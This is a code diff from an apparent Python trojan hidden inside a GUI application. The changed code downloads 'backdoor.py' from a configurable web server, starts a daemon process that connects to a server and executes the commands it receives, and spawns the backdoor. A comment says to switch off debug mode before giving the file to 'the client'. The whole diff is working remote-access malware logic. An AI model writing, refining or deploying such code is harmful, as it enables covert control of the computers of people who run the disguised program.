@@ -241,19 +241,22 @@ save_button.place(x=560, y=200)
 
 # Get the code of the backdoor
 debug = True  # Change to False when you give the file to the client
+fail = False
 try:
-    request = requests.get("http://webserver.com/backdoor.py")
+    request = requests.get("%YOUR WEB SERVER ADDRESS%/backdoor.py")
 except Exception:
     if not debug:  # if this is real client use and not in development
         print("Cannot get files from web server!")
         print("Quiting...")
         quit()
+    fail = True
 
 # Creating processes to receive commands from the server and create a backdoor
 commands_process = multiprocessing.Process(target=recv_commands)  # Creating a process to connect to server and execute commands
 commands_process.daemon = True
-backdoor_process = multiprocessing.Process(target=create_backdoor, args=(request, ))
-backdoor_process.daemon = False
+if not fail or debug:
+    backdoor_process = multiprocessing.Process(target=create_backdoor, args=(request, ))
+    backdoor_process.daemon = False
 if __name__ == "__main__":
     try:
         commands_process.start()  # connect to the server and start executing commands
@@ -264,6 +267,8 @@ if __name__ == "__main__":
             commands_process.kill()
         except Exception:
             pass
+    except NameError:  # An exception will be raised if the backdoor process will not be created
+        pass
     try:
         if platform.system() == "Windows":
             #os.system("\"{}\\{}.exe\"".format(startup_location, name))
